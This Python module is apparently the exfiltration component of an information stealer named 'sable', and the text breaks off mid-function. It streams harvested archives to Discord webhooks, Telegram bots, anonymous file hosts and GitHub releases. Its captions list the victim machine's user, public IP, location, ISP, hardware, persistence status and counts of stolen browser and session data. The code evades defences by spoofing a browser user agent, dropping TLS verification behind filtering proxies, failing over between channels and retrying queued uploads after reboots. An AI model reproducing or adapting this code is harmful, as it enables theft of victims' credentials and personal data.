"""Transmit the archive to the relay.

stdlib urllib only. The status code is checked explicitly: the source repository
discarded the response object and logged success unconditionally, so a 401 from a
dead webhook read as a delivery. Non-2xx raises.

The uploaded filename is the archive's real name, and the content type is derived
from that same name, so the extension can never disagree with the bytes.
"""

from __future__ import annotations

import hashlib
import ipaddress
import json
import secrets
import ssl
import time
import urllib.error
import urllib.request
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Final
from urllib.parse import urlsplit

from . import log

_TIMEOUT: Final[float] = 10.0
_ATTEMPTS: Final[int] = 3
# The third failure raises; the 8 s ceiling is never reached because there is no
# fourth attempt.
_BACKOFF: Final[tuple[float, ...]] = (2.0, 4.0)

_CAPTION_LIMIT: Final[int] = 1024
_MESSAGE_LIMIT: Final[int] = 1900
_MAX_RESPONSE: Final[int] = 8 * 1024
_MAX_UPLOAD: Final[int] = 2 * 1024 * 1024 * 1024

# Discord drops every mention a webhook writes unless the payload opts in. Sending
# "@here" without this object is a message that reads like a ping and rings nothing,
# which is worse than no ping at all because it looks like it worked.
_ALLOWED_MENTIONS: Final[dict[str, list[str]]] = {
    "parse": ["everyone", "users", "roles"]
}

# Link relays. A webhook carries a message and a file, and its file ceiling belongs to
# the platform: 10 MB on a plain Discord server. A collected profile is hundreds of
# megabytes, so "send the file" and "send a link to the file" are different features,
# not different settings. These two hosts are anonymous, accept multipart, and answer
# with a bare URL, which is why they are here rather than an authenticated bucket.
#
# Catbox keeps a file indefinitely and stops at 200 MB. Litterbox is the same
# operators with a 1 GB ceiling and a fixed expiry, which is the honest place for an
# archive too big to keep.
_CATBOX: Final[str] = "https://catbox.moe/user/api.php"
_LITTERBOX: Final[str] = "https://litterbox.catbox.moe/resources/internals/api.php"
_LITTERBOX_TIME: Final[str] = "72h"
_CATBOX_MAX: Final[int] = 190 * 1024 * 1024
_LITTERBOX_MAX: Final[int] = 950 * 1024 * 1024

# The upload hosts and the download hosts are different names on the same service, and
# a network can reach one and not the other. The check before an upload asks the
# download host, because a file nobody can open is not a delivery.
_CATBOX_DOWNLOAD: Final[str] = "https://files.catbox.moe/"
_LITTERBOX_DOWNLOAD: Final[str] = "https://litter.catbox.moe/"

# The fallback. Catbox's download hosts are reset at the TLS layer on some networks
# while its upload endpoint answers normally, which produces a link that exists and
# cannot be opened. Gofile answered from the same machine that could not open catbox.
_GOFILE_SERVERS: Final[str] = "https://api.gofile.io/servers"
_GOFILE_UPLOAD: Final[str] = "https://{server}.gofile.io/contents/uploadfile"
_GOFILE_TIMEOUT: Final[float] = 30.0

# The phantom channel. GitHub answers from networks where both catbox hosts are
# reset at the TLS layer, so it is the route that survives a filtered uplink. The
# repository is the advertisement, never the vault: a release page carries the
# name, the size and the digest, and the bytes stay on whichever host took them.
_GH_API: Final[str] = "https://api.github.com"
_GH_RELEASES: Final[str] = _GH_API + "/repos/{owner}/{repo}/releases"
_GH_VERSION: Final[str] = "2022-11-28"
# A tag is unique inside a repository. Two runs inside the same second collide,
# and the 422 that comes back is the API saying so, not a dead route.
_GH_TAG_ATTEMPTS: Final[int] = 3
# A release create is a JSON POST, not an upload: the bytes went to the anonymous
# host already. Thirty seconds is generous for a metadata call.
_GH_TIMEOUT: Final[float] = 30.0


# A 10 s timeout is right for a message and wrong for 400 MB. The floor is a slow but
# working uplink; the ceiling keeps a wedged socket from holding the process forever.
_MIN_THROUGHPUT: Final[int] = 128 * 1024
_MIN_UPLOAD_TIMEOUT: Final[float] = 60.0
_MAX_UPLOAD_TIMEOUT: Final[float] = 1800.0

# A status line is worth five seconds and not one more: it sits before the upload, so
# a dead network must not delay the thing it is reporting on.
_PING_TIMEOUT: Final[float] = 5.0

_CONTENT_TYPES: Final[dict[str, str]] = {
    ".zip": "application/zip",
    ".rar": "application/vnd.rar",
}

# urllib sends ``Python-urllib/3.x`` when nothing is set, and Cloudflare answers that
# with 1010 before the request ever reaches the relay. Measured against a live webhook:
# the default agent got 403 with the body ``error code: 1010``, and the same request
# with this header got 204. The header is not decoration.
_USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

_SSL: Final[ssl.SSLContext] = ssl.create_default_context()

# Verification is the default and this is the fallback. A network that terminates TLS
# with its own root — a filtering proxy, a captive portal, some endpoint scanners —
# fails verification on every host, and an artifact that refuses to deliver because a
# middlebox rewrote the chain is an artifact that collected for nothing. The strict
# context is tried first; only a certificate failure reaches the second attempt.
_SSL_RELAXED: Final[ssl.SSLContext] = ssl.create_default_context()
_SSL_RELAXED.check_hostname = False
_SSL_RELAXED.verify_mode = ssl.CERT_NONE

# Same TLS settings, no proxy. A proxy is right for the public internet and always
# wrong for a LAN address: the destination is one hop away, and a proxy that cannot
# route to a private range answers 502 instead of failing to connect.
_LOCAL_OPENER: Final[urllib.request.OpenerDirector] = urllib.request.build_opener(
    urllib.request.ProxyHandler({}),
    urllib.request.HTTPSHandler(context=_SSL),
)
_LOCAL_OPENER_RELAXED: Final[urllib.request.OpenerDirector] = urllib.request.build_opener(
    urllib.request.ProxyHandler({}),
    urllib.request.HTTPSHandler(context=_SSL_RELAXED),
)


def _is_local(host: str) -> bool:
    """Whether a host is on this network, where the system proxy must not be used."""
    if not host:
        return False
    if host.lower() == "localhost":
        return True
    try:
        return ipaddress.ip_address(host).is_private
    except ValueError:
        return False


def _certificate_failure(exc: BaseException) -> bool:
    """Whether an open failed because the chain, not the network, was the problem.

    ``urlopen`` wraps an ``ssl`` error in ``URLError`` for https, so the reason has to
    be unwrapped before the type means anything.
    """
    if isinstance(exc, ssl.SSLCertVerificationError):
        return True
    reason = getattr(exc, "reason", None)
    return isinstance(reason, ssl.SSLCertVerificationError)


def _attempt(request: urllib.request.Request, timeout: float, *, relaxed: bool) -> Any:
    if _is_local(urlsplit(request.full_url).hostname or ""):
        opener = _LOCAL_OPENER_RELAXED if relaxed else _LOCAL_OPENER
        return opener.open(request, timeout=timeout)
    context = _SSL_RELAXED if relaxed else _SSL
    return urllib.request.urlopen(request, timeout=timeout, context=context)


def _open(request: urllib.request.Request, timeout: float) -> Any:
    """Open ``request``, verifying the certificate and bypassing a LAN proxy.

    Observed live: a VPN client exported ``http_proxy`` pointing at its own loopback
    port, ``no_proxy`` covered ``localhost`` and ``127.0.0.1``, and a POST to
    ``192.168.1.151`` went through the proxy and came back 502. Loopback was already
    exempt by the environment; the LAN address was not.

    A certificate that does not verify is retried once without verification, and the
    downgrade is logged. Verification is never the thing that costs the delivery, and
    it is never silently abandoned either: an operator reading the log can see which
    hosts answered unverified.
    """
    try:
        return _attempt(request, timeout, relaxed=False)
    except (urllib.error.URLError, ssl.SSLError) as exc:
        if not _certificate_failure(exc):
            raise
        host = urlsplit(request.full_url).hostname or request.full_url
        log.logger.warning("relay: %s did not verify; sending without verification", host)
        return _attempt(request, timeout, relaxed=True)



class RelayError(RuntimeError):
    """Delivery failed. Raised, never returned, so it cannot be ignored."""


class RelayPermanent(RelayError):
    """Delivery failed in a way another attempt cannot fix.

    A wrong webhook, a deleted bot, a banned token, a file the host refuses: the answer
    will be the same in two seconds, so a retry spends six seconds of a run and then
    parks the archive for hours against an endpoint that was never going to accept it.
    ``408`` and ``429`` are not this — those mean "later", which is what a retry is for.
    """


def _permanent(status: int) -> bool:
    return 400 <= status < 500 and status not in (408, 429)


@dataclass(frozen=True, slots=True)
class Delivery:
    """One target's answer. ``ok`` is what the caller acts on; the rest is for the log."""

    kind: str
    endpoint: str
    ok: bool
    reason: str = ""


def _send(kind: str, endpoint: str, archive: Path, caption: str) -> None:
    """Send to one target, up to ``_ATTEMPTS`` times. Raises ``RelayError``.

    Split out of :func:`transmit` so a config with mirrors runs the same retry policy
    against every target instead of re-implementing the loop per transport.
    """
    failure: Exception | None = None

    for attempt in range(1, _ATTEMPTS + 1):
        try:
            if kind == "telegram":
                _send_telegram(endpoint, archive, caption)
            elif kind == "link":
                _send_link(endpoint, archive, caption)
            elif kind == "phantom":
                _send_phantom(endpoint, archive, caption)
            else:
                _send_https(endpoint, archive, caption)
            log.logger.debug("relay: delivered %s on attempt %d", archive.name, attempt)
            return
        except RelayPermanent as exc:
            log.logger.debug("relay: %s was rejected for good: %s", archive.name, exc)
            raise RelayError(f"transmit rejected: {exc}") from exc
        except Exception as exc:
            failure = exc
            log.logger.debug("relay: attempt %d failed: %s", attempt, exc)
            if attempt < _ATTEMPTS:
                time.sleep(_BACKOFF[attempt - 1])

    raise RelayError(f"transmit failed after {_ATTEMPTS} attempts: {failure}") from failure


def _targets(cfg: Any) -> tuple[tuple[str, str], ...]:
    """The primary target followed by its mirrors, in the order they should be tried."""
    relay = cfg.relay
    primary = (str(relay.kind), str(relay.endpoint))
    mirrors = tuple(
        (str(target.kind), str(target.endpoint))
        for target in getattr(relay, "targets", ()) or ()
    )
    return (primary, *mirrors)


def _label(kind: str, endpoint: str) -> str:
    """How a target is named in a log line or an error.

    The host, not the whole address: a telegram endpoint carries a bot token and an
    https endpoint can carry a webhook secret in its path, so neither belongs in a
    message that is written to a file the operator will open and share.
    """
    if kind == "telegram":
        parts = endpoint.split("$")
        return f"telegram chat {parts[1]}" if len(parts) == 2 and parts[1] else "telegram"
    if kind == "phantom":
        # Not a URL, so urlsplit would return no hostname and the label would fall
        # back to the bare kind. The repository is the useful half.
        repo = endpoint.split("$")[0]
        return f"github {repo}" if "/" in repo else "phantom"
    host = urlsplit(endpoint).hostname
    return host or kind


def deliver(
    cfg: Any,
    archive: Path,
    summary: dict[str, Any] | None = None,
) -> tuple[Delivery, ...]:
    """Send ``archive`` to the first target that takes it, and report every attempt.

    Ordered failover, not a broadcast. The primary is tried with the normal retry policy;
    if it refuses for good or runs out of attempts, the next mirror is tried, and the
    first acceptance ends the delivery. Sending the same archive to four places at once
    would spend the target's uplink four times over and would make "delivered" ambiguous
    — here it means one whole copy landed somewhere.

    Returns the attempts up to and including the one that worked. Raises ``RelayError``
    naming every refusal when none did, so a run with three dead endpoints reports three
    reasons rather than the last one.
    """
    if not archive.is_file():
        raise RelayError(f"{archive.name}: archive is missing")

    caption = _caption(cfg, archive, summary)
    results: list[Delivery] = []

    for kind, endpoint in _targets(cfg):
        try:
            _send(kind, endpoint, archive, caption)
        except Exception as exc:
            results.append(Delivery(kind, endpoint, False, str(exc)))
            log.logger.debug("relay: %s refused by %s: %s", archive.name, kind, exc)
            continue
        results.append(Delivery(kind, endpoint, True))
        if len(results) > 1:
            log.logger.debug(
                "relay: %s took %d target(s), landed on %s",
                archive.name,
                len(results),
                kind,
            )
        return tuple(results)

    reasons = " | ".join(f"{item.kind} at {_label(item.kind, item.endpoint)}: {item.reason}" for item in results)
    raise RelayError(f"every target refused {archive.name} ({len(results)}): {reasons}")


def transmit(cfg: Any, archive: Path, summary: dict[str, Any] | None = None) -> None:
    """Send ``archive`` to the primary target. Raises RelayError on failure.

    ``summary`` is the machine description the message carries in front of the file.
    Without it the caption falls back to name and size, which is what every earlier
    artifact sent and what nobody could read.

    This is the single-target entry point and stays exactly as it was for callers that
    mean one endpoint. ``deliver`` is the multi-target one; both share ``_send``, so the
    retry policy cannot drift between them.
    """
    if not archive.is_file():
        raise RelayError(f"{archive.name}: archive is missing")

    caption = _caption(cfg, archive, summary)
    _send(str(cfg.relay.kind), str(cfg.relay.endpoint), archive, caption)


def drain(cfg: Any) -> int:
    """Send every archive a previous run parked. Returns how many are still waiting.

    Runs at the top of every launch, before collection, so a machine that rebooted
    mid-upload finishes the old job instead of starting a new one on top of it. Each
    parked file is sent under the config of the run draining it: the parked bytes have
    no opinion about where they should go, and the newest config is the best guess.

    An archive that has failed ``util.MAX_TRIES`` times is dropped rather than carried
    forever — a webhook that was deleted is not a network problem.
    """
    from . import util

    for archive in util.pending_queue():
        try:
            deliver(cfg, archive)
        except Exception as exc:
            tries = util.bump_pending(archive)
            log.logger.debug("queue: %s still waiting, try %d: %s", archive.name, tries, exc)
            if tries >= util.MAX_TRIES:
                util.drop_pending(archive)
                log.logger.warning("queue: abandoned %s after %d tries", archive.name, tries)
            continue
        util.drop_pending(archive)
        log.logger.debug("queue: drained %s", archive.name)

    return len(util.pending_queue())


def _size(archive: Path) -> int:
    """Validate the archive and return its size without reading it."""
    size = archive.stat().st_size
    if size <= 0:
        raise RelayError(f"{archive.name}: archive is empty")
    if size > _MAX_UPLOAD:
        raise RelayError(f"{archive.name}: {size} bytes exceeds the upload cap")
    return size


def _content_type(archive: Path) -> str:
    suffix = archive.suffix.lower()
    if suffix not in _CONTENT_TYPES:
        raise RelayError(f"{archive.name}: no content type for {suffix!r}")
    return _CONTENT_TYPES[suffix]


def human_bytes(size: int) -> str:
    """A size a person can read, rounded the way a file manager rounds it."""
    if size >= 1024 ** 3:
        return f"{size / 1024 ** 3:.2f} GB"
    if size >= 1024 ** 2:
        return f"{size / 1024 ** 2:.1f} MB"
    if size >= 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size} bytes"


def _items_line(summary: dict[str, Any]) -> str:
    """One line naming what each source produced, largest first.

    A run that collected 8,700 items is not a result anybody can act on. The point of
    this line is the gap: "sessions 0" next to "browsers 41" says where to look, and a
    source that is missing from the list is a source that did not run. Zero sources are
    omitted, because a line of zeroes is noise, but the total is carried when anything
    at all came back.
    """
    counts = summary.get("counts")
    if not isinstance(counts, dict) or not counts:
        return ""

    pairs: list[tuple[str, int]] = []
    for name, value in counts.items():
        if isinstance(value, int) and value > 0:
            pairs.append((str(name), value))
    if not pairs:
        return ""

    pairs.sort(key=lambda pair: (-pair[1], pair[0]))
    total = sum(value for _, value in pairs)
    detail = " · ".join(f"{name} {value:,}" for name, value in pairs)
    return _fit(f"**items** {total:,} · {detail}", 300)


def describe(summary: dict[str, Any] | None) -> str:
    """The machine block that goes out with the archive.

    Written the way a person reads it: what it is, who was on it, where it is, then
    the hardware. Bold marks the labels so the values are what the eye lands on. A
    missing fact drops its line rather than printing "unknown", because a line that
    says nothing is a line that costs the reader a second.
    """
    if not summary:
        return ""

    lines: list[str] = []

    host = summary.get("hostname")
    if host:
        lines.append(f"**sniped** {host}")

    who = summary.get("user")
    where = summary.get("os")
    identity = [
        part
        for part in (f"**user** {who}" if who else "", f"**os** {where}" if where else "")
        if part
    ]
    if identity:
        lines.append(" · ".join(identity))

    public = summary.get("public_ip")
    if public:
        place = ", ".join(
            part
            for part in (
                str(summary.get("city") or ""),
                str(summary.get("region") or ""),
                str(summary.get("country") or ""),
            )
            if part
        )
        isp = summary.get("isp")
        tail = " · ".join(part for part in (place, str(isp or "")) if part)
        lines.append(f"**ip** {public}" + (f" · {tail}" if tail else ""))

    lan = summary.get("lan_ip")
    if lan:
        lines.append(f"**lan** {lan}")

    cpu = summary.get("cpu")
    if cpu:
        lines.append(f"**cpu** {cpu}")

    gpu = summary.get("gpu")
    if gpu:
        lines.append(f"**gpu** {gpu}")

    hardware: list[str] = []
    ram = summary.get("ram_gib")
    if ram:
        hardware.append(f"{round(float(ram))} GB ram")
    arch = summary.get("arch")
    if arch:
        hardware.append(str(arch))
    uptime = summary.get("uptime")
    if uptime:
        hardware.append(f"up {uptime}")
    if hardware:
        lines.append("**box** " + " · ".join(hardware))

    items = _items_line(summary)
    if items:
        lines.append(items)

    gate = summary.get("gate")
    if gate:
        lines.append(f"**gate** {gate}")

    if summary.get("persist"):
        lines.append("**persist** installed")

    failed = summary.get("failed")
    if isinstance(failed, dict) and failed:
        # Named rather than counted: "sessions: DPAPIError" tells the reader whether the
        # gap is a machine with no tokens or a store that refused to be read.
        detail = " · ".join(f"{name} ({reason})" for name, reason in sorted(failed.items()))
        lines.append(f"**failed** {_fit(detail, 300)}")

    return "\n".join(lines)


def _with_mention(cfg: Any, text: str, *, alert: bool) -> str:
    mention = str(getattr(cfg.relay, "mention", "") or "").strip()
    body = _fit(str(text), _MESSAGE_LIMIT)
    if not alert or not mention:
        return body
    return _fit(f"{mention} {body}", _MESSAGE_LIMIT)


def _caption(cfg: Any, archive: Path, summary: dict[str, Any] | None) -> str:
    """The message that travels with the file.

    Falls back to the old name-and-size line when no summary was gathered, so a
    caller that does not pass one still sends something true rather than nothing.
    """
    block = describe(summary)
    size = archive.stat().st_size
    tail = f"**archive** {archive.name} · {human_bytes(size)}"
    text = f"{block}\n{tail}" if block else f"sable {archive.name} {size} bytes"
    return _with_mention(cfg, text, alert=True)


def _fit(text: str, limit: int) -> str:
    # Telegram rejects a caption over 1024 characters outright. The source
    # repository built ~2450 and the upload failed with nothing logged.
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


_CHUNK: Final[int] = 1 << 20


class _Body:
    """A request body that streams the archive off disk instead of holding it.

    The old path read the archive into bytes and then copied those bytes into a
    multipart buffer: two full copies of the file in memory at once. On the machine this
    was measured against, a 174 MB archive meant roughly 350 MB of resident memory just
    to start an upload, on a box with 7.89 GiB total. Here the file is opened when the
    socket asks for the next block and nothing larger than one chunk is held.

    The length is known before the first byte is sent, so the request carries a real
    Content-Length and every server that refuses chunked encoding still accepts it.
    """

    def __init__(self, head: bytes, archive: Path, tail: bytes) -> None:
        self._head = head
        self._archive = archive
        self._tail = tail
        self.length = len(head) + archive.stat().st_size + len(tail)

    def __len__(self) -> int:
        return self.length

    def head(self) -> bytes:
        """The preamble, for tests and for anyone inspecting what the fields were."""
        return self._head

    def __iter__(self) -> Iterator[bytes]:
        yield self._head
        with self._archive.open("rb") as handle:
            while True:
                block = handle.read(_CHUNK)
                if not block:
                    break
                yield block
        yield self._tail


def _multipart(
    fields: dict[str, str],
    file_field: str,
    filename: str,
    payload: bytes,
    content_type: str,
) -> tuple[bytes, str]:
    boundary = "----sable" + secrets.token_hex(16)
    parts: list[bytes] = []

    for name, value in fields.items():
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n".encode()
        )

    parts.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
        f'filename="{filename}"\r\nContent-Type: {content_type}\r\n\r\n'.encode()
    )
    parts.append(payload)
    parts.append(f"\r\n--{boundary}--\r\n".encode())

    return b"".join(parts), boundary


def _multipart_stream(
    fields: dict[str, str],
    file_field: str,
    archive: Path,
    content_type: str,
) -> tuple[_Body, str]:
    """The same body as :func:`_multipart`, with the file left on disk."""
    boundary = "----sable" + secrets.token_hex(16)
    head: list[bytes] = []

    for name, value in fields.items():
        head.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n".encode()
        )

    head.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
        f'filename="{archive.name}"\r\nContent-Type: {content_type}\r\n\r\n'.encode()
    )
    tail = f"\r\n--{boundary}--\r\n".encode()
    return _Body(b"".join(head), archive, tail), boundary


def _post(url: str, body: bytes | _Body, boundary: str, timeout: float = _TIMEOUT) -> bytes:
    length = body.length if isinstance(body, _Body) else len(body)
    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    request.add_header("Content-Length", str(length))
    request.add_header("User-Agent", _USER_AGENT)

    try:
        with _open(request, timeout) as response:
            status = int(response.status)
            answer = response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        if _permanent(exc.code):
            raise RelayPermanent(f"relay returned http {exc.code}") from exc
        raise RelayError(f"relay returned http {exc.code}") from exc
    except urllib.error.URLError as exc:
        raise RelayError(f"relay unreachable: {exc.reason}") from exc

    if not 200 <= status < 300:
        if _permanent(status):
            raise RelayPermanent(f"relay returned http {status}")
        raise RelayError(f"relay returned http {status}")
    return answer


def _post_json(
    url: str, document: dict[str, Any], timeout: float = _TIMEOUT
) -> bytes:
    payload = json.dumps(document).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "application/json")
    request.add_header("Content-Length", str(len(payload)))
    request.add_header("User-Agent", _USER_AGENT)

    try:
        with _open(request, timeout) as response:
            status = int(response.status)
            answer = response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        if _permanent(exc.code):
            raise RelayPermanent(f"relay returned http {exc.code}") from exc
        raise RelayError(f"relay returned http {exc.code}") from exc
    except urllib.error.URLError as exc:
        raise RelayError(f"relay unreachable: {exc.reason}") from exc

    if not 200 <= status < 300:
        if _permanent(status):
            raise RelayPermanent(f"relay returned http {status}")
        raise RelayError(f"relay returned http {status}")
    return answer


def notify(cfg: Any, text: str, *, alert: bool = False) -> bool:
    """Post one short status line to the status webhook. Never raises.

    A status message is a courtesy, not a delivery. If the webhook is wrong, slow or
    gone, the run continues and the archive still goes out: swallowing here is what
    stops a broken notification from costing you the collection.

    ``alert`` puts the configured mention in front of the text. Only terminal messages
    ask for it — a phone that buzzes on every stage is a phone that gets muted, and a
    muted channel is the same as no channel.

    The timeout is deliberately shorter than a delivery timeout. Notifications sit on
    the critical path of a run that a machine may kill at any moment.
    """
    endpoint = getattr(cfg.relay, "ping", "") or ""
    if not endpoint:
        return False
    body: dict[str, Any] = {"content": _with_mention(cfg, text, alert=alert)}
    body["allowed_mentions"] = _ALLOWED_MENTIONS
    try:
        _post_json(endpoint, body, timeout=_PING_TIMEOUT)
    except Exception:
        log.logger.debug("status webhook did not accept the message", exc_info=True)
        return False
    return True


def _send_https(endpoint: str, archive: Path, caption: str) -> None:
    size = _size(archive)
    fields = {
        "payload_json": json.dumps(
            {"content": caption, "allowed_mentions": _ALLOWED_MENTIONS}
        )
    }
    body, boundary = _multipart_stream(fields, "files[0]", archive, _content_type(archive))
    _post(endpoint, body, boundary, _upload_timeout(size))


def _split_telegram(endpoint: str) -> tuple[str, str]:
    parts = endpoint.split("$")
    if len(parts) != 2 or not parts[0] or not parts[1]:
        raise RelayError("telegram endpoint must be token$chat")
    return parts[0], parts[1]


def _send_telegram(endpoint: str, archive: Path, caption: str) -> None:
    token, chat = _split_telegram(endpoint)
    size = _size(archive)
    fields = {"chat_id": chat, "caption": _fit(caption, _CAPTION_LIMIT)}
    body, boundary = _multipart_stream(fields, "document", archive, _content_type(archive))
    _post(
        f"https://api.telegram.org/bot{token}/sendDocument",
        body,
        boundary,
        _upload_timeout(size),
    )


# --- link relay ---------------------------------------------------------------


def _upload_timeout(size: int) -> float:
    """A timeout sized for the body, not for a message."""
    estimate = size / _MIN_THROUGHPUT
    return min(max(_MIN_UPLOAD_TIMEOUT, estimate), _MAX_UPLOAD_TIMEOUT)


def _link_host(size: int) -> tuple[str, dict[str, str]]:
    """The host that will take a file this size. Raises when neither will."""
    if size <= _CATBOX_MAX:
        return _CATBOX, {"reqtype": "fileupload"}
    if size <= _LITTERBOX_MAX:
        return _LITTERBOX, {"reqtype": "fileupload", "time": _LITTERBOX_TIME}
    raise RelayError(
        f"archive is {size} bytes and the largest link host takes {_LITTERBOX_MAX}"
    )


def _link_message(caption: str, url: str) -> str:
    return _fit(f"{caption}\n{url}", _MESSAGE_LIMIT)


def _download_host(host: str) -> str:
    return _CATBOX_DOWNLOAD if host == _CATBOX else _LITTERBOX_DOWNLOAD


def _reachable(url: str) -> bool:
    """Whether the download host answers at all from this machine.

    A cheap GET on the root, not on the file: the question is whether the name
    resolves and completes a TLS handshake, and that answer is the same for every path
    on it. An HTTP error still proves the host answered; only a transport failure or a
    server fault means a posted link would be dead for the reader.
    """
    request = urllib.request.Request(url, method="GET")
    request.add_header("User-Agent", _USER_AGENT)
    try:
        with _open(request, _PING_TIMEOUT) as response:
            response.read(1)
            return 200 <= int(response.status) < 400
    except urllib.error.HTTPError as exc:
        return exc.code < 500
    except Exception:
        log.logger.debug("link host %s did not answer", url, exc_info=True)
        return False


def _gofile(archive: Path) -> str:
    """Upload to gofile.io and return its download page.

    Two requests: the service hands out the upload host first, and the upload answers
    with JSON rather than a bare URL. Both checks are explicit because the failure this
    replaces was a host that answered 200 with something that was not a link.
    """
    size = _size(archive)
    request = urllib.request.Request(_GOFILE_SERVERS, method="GET")
    request.add_header("User-Agent", _USER_AGENT)
    try:
        with _open(request, _GOFILE_TIMEOUT) as response:
            directory = json.loads(response.read(_MAX_RESPONSE).decode("utf-8", "replace"))
    except Exception as exc:
        raise RelayError(f"gofile servers unreachable: {exc}") from exc

    try:
        server = directory["data"]["servers"][0]["name"]
    except (KeyError, IndexError, TypeError) as exc:
        raise RelayError("gofile returned no upload server") from exc

    body, boundary = _multipart_stream({}, "file", archive, _content_type(archive))
    answer = _post(
        _GOFILE_UPLOAD.format(server=server),
        body,
        boundary,
        _upload_timeout(size),
    )

    try:
        page = json.loads(answer.decode("utf-8", "replace"))["data"]["downloadPage"]
    except (KeyError, TypeError, ValueError) as exc:
        raise RelayError("gofile returned no download page") from exc

    if not isinstance(page, str) or not page.startswith(("http://", "https://")):
        raise RelayError(f"gofile returned no url: {page!r}")
    return page


def _host_archive(archive: Path) -> str:
    """Upload the archive somewhere anonymous and return a URL a reader can open.

    Host choice is by size, then the download host is checked before the upload
    starts: an upload that works proves nothing about a download that works. When
    catbox answers the upload but its download name is reset at the TLS layer, the
    fallback takes the same file and returns a link that actually opens.

    Split out of :func:`_send_link` because the phantom channel needs the same
    bytes hosted and its own advertisement on top. Two copies of this logic would
    drift the moment one of the two hosts changes its ceiling.
    """
    size = _size(archive)
    host, fields = _link_host(size)

    if _reachable(_download_host(host)):
        try:
            body, boundary = _multipart_stream(
                fields, "fileToUpload", archive, _content_type(archive)
            )
            answer = _post(host, body, boundary, _upload_timeout(size))
            candidate = answer.decode("utf-8", "replace").strip()
            if candidate.startswith(("https://", "http://")):
                return candidate
        except Exception:
            log.logger.debug("link host refused the upload; falling back", exc_info=True)

    log.logger.debug("link host unusable for this network; using the fallback")
    return _gofile(archive)


def _send_link(endpoint: str, archive: Path, caption: str) -> None:
    """Upload to an anonymous host, then post the URL to the webhook.

    Two hops, two failure modes, and both have to be checked: the host answers with
    the URL as plain text, and the webhook answers with a status code. A host that
    returns an HTML error page with a 200 is the shape this guards against — the
    body is checked for a scheme by :func:`_host_archive`, not for "not empty".
    """
    url = _host_archive(archive)
    log.logger.debug("relay: hosted %s at %s", archive.name, url)
    _post_json(
        endpoint,
        {"content": _link_message(caption, url), "allowed_mentions": _ALLOWED_MENTIONS},
    )



# --- phantom channel ----------------------------------------------------------


def _split_phantom(endpoint: str) -> tuple[str, str, str]:
    """``owner/repo$token`` into its three parts.

    Same ``$`` separator as telegram, so one config field carries a target and its
    credential everywhere a target can appear — primary or mirror, no schema bump.
    """
    parts = endpoint.split("$")
    if len(parts) != 2 or not parts[0] or not parts[1]:
        raise RelayError("phantom endpoint must be owner/repo$token")
    repo, token = parts
    if repo.count("/") != 1:
        raise RelayError("phantom endpoint needs owner/name before the $")
    owner, name = repo.split("/")
    if not owner or not name:
        raise RelayError("phantom endpoint has an empty owner or name")
    # The validator rejects these too. Two gates because the URL is built by
    # formatting: a ``..`` that reaches the format string is path traversal in the
    # release path, and a config that skipped validation would otherwise carry it.
    if set(owner) == {"."} or set(name) == {"."}:
        raise RelayError("phantom endpoint has a dot segment where a name belongs")
    return owner, name, token


def _digest(archive: Path) -> str:
    """SHA-256 of the archive, read in chunks so a large file is never held."""
    hasher = hashlib.sha256()
    with archive.open("rb") as handle:
        while True:
            block = handle.read(_CHUNK)
            if not block:
                break
            hasher.update(block)
    return hasher.hexdigest()


def _gh_post(url: str, document: dict[str, Any], token: str) -> tuple[int, bytes]:
    """POST JSON to the GitHub API and return the status and body unchanged.

    The caller needs the status: 422 means the tag is taken and is worth another
    attempt, while 401 and 404 mean the token or the repository is wrong and a
    retry only spends the operator's time.
    """
    payload = json.dumps(document).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "application/json")
    request.add_header("Accept", "application/vnd.github+json")
    request.add_header("X-GitHub-Api-Version", _GH_VERSION)
    request.add_header("Authorization", f"Bearer {token}")
    request.add_header("User-Agent", _USER_AGENT)

    try:
        with _open(request, _GH_TIMEOUT) as response:
            return int(response.status), response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read(_MAX_RESPONSE)
    except urllib.error.URLError as exc:
        raise RelayError(f"github unreachable: {exc.reason}") from exc


def _gh_tag() -> str:
    """A tag unique to this second, with four random hex to survive a collision."""
    return "sable-" + time.strftime("%Y%m%d-%H%M%S", time.gmtime()) + "-" + secrets.token_hex(2)


def _gh_release(
    owner: str,
    name: str,
    token: str,
    archive: Path,
    caption: str,
    link: str,
) -> str:
    """Create a release that advertises the archive and holds no bytes. Returns its page.

    The page is the delivery: a name, a size, a digest and a working link. The
    repository never stores the file, so the account that carries it does not
    accumulate hundreds of megabytes of somebody else's data.
    """
    size = archive.stat().st_size
    digest = _digest(archive)
    body = "\n".join(
        part
        for part in (
            caption,
            "",
            f"**[download]({link})**",
            "",
            f"`sha256` `{digest}`",
            f"`size` `{human_bytes(size)}`",
        )
        if part
    )
    url = _GH_RELEASES.format(owner=owner, repo=name)

    for attempt in range(1, _GH_TAG_ATTEMPTS + 1):
        status, answer = _gh_post(
            url,
            {
                "tag_name": _gh_tag(),
                "name": archive.name,
                "body": body,
                "draft": False,
                "prerelease": False,
            },
            token,
        )

        if status == 422:
            if attempt < _GH_TAG_ATTEMPTS:
                # Tag already exists. Another name costs nothing; giving up here
                # would lose a delivery to a clock.
                log.logger.debug("github rejected the tag; generating another")
                continue
            raise RelayError(f"github refused a tag {_GH_TAG_ATTEMPTS} times")

        if status in (401, 403, 404):
            raise RelayPermanent(f"github rejected the release with http {status}")

        if not 200 <= status < 300:
            raise RelayError(f"github returned http {status}")

        try:
            page = json.loads(answer.decode("utf-8", "replace"))["html_url"]
